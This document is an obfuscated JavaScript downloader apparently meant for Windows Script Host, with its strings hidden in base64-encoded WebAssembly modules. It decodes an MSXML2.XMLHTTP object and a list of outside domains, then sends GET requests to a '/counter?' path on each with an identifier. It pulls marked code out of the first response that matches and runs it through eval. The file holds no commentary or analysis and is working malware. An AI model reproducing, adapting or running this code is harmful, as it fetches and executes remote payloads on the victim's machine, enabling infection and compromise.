const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGxoGAgAAhfwBBAQt/AEHwAAt/AEGAAQt/AEGGAQt/AEGIAQt/AEGMAQt/AEGOAQt/AEGUAQt/AEGaAQt/AEGeAQt/AEGgAQt/AEGkAQt/AEGmAQt/AEGqAQt/AEGuAQt/AEGwAQt/AEG4AQt/AEG+AQt/AEHSAQt/AEHsAQt/AEGAAgt/AEGSAgt/AEGyAgt/AEG4Agt/AEG6Agt/AEG8Agt/AEHCAgt/AEHIAgt/AEHYAgt/AEHaAgt/AEHcAgt/AEHeAgt/AEHiAgsHqYKAgAAiBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0GZGF0YTE0Aw4GZGF0YTE1Aw8GZGF0YTE2AxAGZGF0YTE3AxEGZGF0YTE4AxIGZGF0YTE5AxMGZGF0YTIwAxQGZGF0YTIxAxUGZGF0YTIyAxYGZGF0YTIzAxcGZGF0YTI0AxgGZGF0YTI1AxkGZGF0YTI2AxoGZGF0YTI3AxsGZGF0YTI4AxwGZGF0YTI5Ax0GZGF0YTMwAx4GZGF0YTMxAx8GZGF0YTMyAyAL/oOAgAAhAEEBC20wMDAwMDAxRVJzNFVGeVF1QWpWUG9WQWE4ejk3SDhSd29WekZkckI1VFc0RTlwSFFobDNvWE0yRWJiTjdHYmk0NTVidHhFeUV1WW4ySzI2WGVsWVYyNzQ0d1dRT0w4a09nOFBDYlNUS3E2ZzAAAEHwAAsPTVNYTUwyLlhNTEhUVFAAAEGAAQsEJTJGAABBhgELAQAAQYgBCwJ0AABBjAELAQAAQY4BCwVaUkFNAABBlAELBCUzQQAAQZoBCwJwAABBngELAQAAQaABCwJTAABBpAELAQAAQaYBCwJhAABBqgELAlQAAEGuAQsBAABBsAELBlBJTEtVAABBuAELBUdFVEEAAEG+AQsTc2hhbmVsbHlzdGFzdGUuY29tAABB0gELGWRlc2s0LjEyM3dlYmRlc2lnbm1lLmNvbQAAQewBCxNib29rYWZ5dHJhaW5lci5jb20AAEGAAgsQYWRpc2dvbGRneW0uY29tAABBkgILH2NvbnNlcnZhdGl2ZWxlYWRlcnNjb3VuY2lsLmNvbQAAQbICCwQlMkYAAEG4AgsBAABBugILAQAAQbwCCwVodHRwAABBwgILBCUzQQAAQcgCCw4lMkZjb3VudGVyJTNGAABB2AILAQAAQdoCCwEAAEHcAgsBAABB3gILAmEAAEHiAgsFZXZhbAA='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var zbafd = lS(0, 0);
var uuu = 0;
(() => {
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return uuu < 999999 ? 1 : 0;
            },
            update: () => {
            },
            body: () => {
                {
                    uuu++;
                }
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
var ijdl = lS(0, 1);
var dfs = WScript.CreateObject(ijdl);
var pusik = [
    lS(0, 2) + lS(0, 3),
    lS(0, 4) + lS(0, 5),
    lS(0, 6),
    lS(0, 7),
    lS(0, 8),
    lS(0, 9),
    lS(0, 10) + lS(0, 11),
    lS(0, 12),
    lS(0, 13),
    lS(0, 14),
    lS(0, 15)
];
pusik[1 + 1] = lS(0, 16);
pusik[2] = pusik[2].substr(0, 3);
var x = [
    lS(0, 17),
    lS(0, 18),
    lS(0, 19),
    lS(0, 20),
    lS(0, 21)
];
var gyt = 0;
var lub = lS(0, 22) + lS(0, 23);
function ataaa(ziyter) {
    window[lS(0, 32, true)](ziyter);
}
function muhter(kjg, lki) {
    return kjg.split(lki);
}
while (true) {
    if (gyt >= x.length) {
        break;
    }
    try {
        var ghyt = false;
        var tjkh = x[gyt + 0];
        (() => {
            const __callInstance3 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        grohot(dfs, pusik[1 + 1] + lS(0, 24), lS(0, 25) + pusik[9] + lS(0, 26) + lub + lub + tjkh + lS(0, 27) + zbafd, ghyt);
                    }
                }
            });
            const __exports = __callInstance3.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        dfs.send();
                    }
                }
            });
            const __exports = __callInstance2.exports;
            return __exports.data();
        })();
        var r = dfs.responseText;
        var rima = 10 * 50;
        var got = 50 + 450 + rima;
        var fontu = r.length;
        var emisogh = 12;
        if (fontu - (4 - 2) * got > emisogh + emisogh - (23 + 1) - got && r.indexOf(zbafd) > got + 1 - 1002) {
            var jiki = muhter(r, lS(0, 28) + zbafd + lS(0, 29));
            var guznam = lS(0, 30) + fuuu(jiki, lS(0, 31)) + pusik[9];
            (() => {
                const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                    env: {
                        impFunc: () => {
                            ataaa(guznam);
                        }
                    }
                });
                const __exports = __callInstance1.exports;
                return __exports.data();
            })();
            break;
        }
        ;
    } catch (e) {
    }
    ;
    gyt++;
}
;
function fuuu(fuu1, fuu2) {
    return fuu1.join(fuu2);
}
function grohot(hunko, b1, b2, b3) {
    (() => {
        const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
            env: {
                impFunc: () => {
                    hunko.open(b1, b2, b3);
                }
            }
        });
        const __exports = __callInstance0.exports;
        return __exports.data();
    })();
}